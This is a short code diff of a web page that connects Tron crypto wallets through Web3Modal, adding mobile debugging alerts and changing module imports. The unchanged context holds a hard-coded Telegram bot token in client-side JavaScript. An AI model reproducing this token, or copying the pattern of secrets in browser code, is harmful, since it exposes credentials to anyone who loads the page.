@@ -50,9 +50,19 @@
     </div>
 
     <!-- Web3Modal logic via ES Modules -->
+    <script>
+        // Global error handler to debug why it's not working on mobile
+        window.onerror = function(msg, url, line, col, error) {
+            alert("Error: " + msg + "\nLine: " + line);
+            return false;
+        };
+        window.addEventListener('unhandledrejection', function(event) {
+            alert("Unhandled Promise Rejection: " + (event.reason ? event.reason.message : event.reason));
+        });
+    </script>
     <script type="module">
-        import { TronWeb } from 'https://esm.sh/tronweb@6.0.4';
-        import { createWeb3Modal, defaultTronConfig } from 'https://esm.sh/@web3modal/tron@4.1.2';
+        import { TronWeb } from 'https://esm.sh/tronweb@6.0.4?bundle';
+        import { createWeb3Modal, defaultTronConfig } from 'https://esm.sh/@web3modal/tron@4.1.2?bundle';
 
         const CONFIG = {
             BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
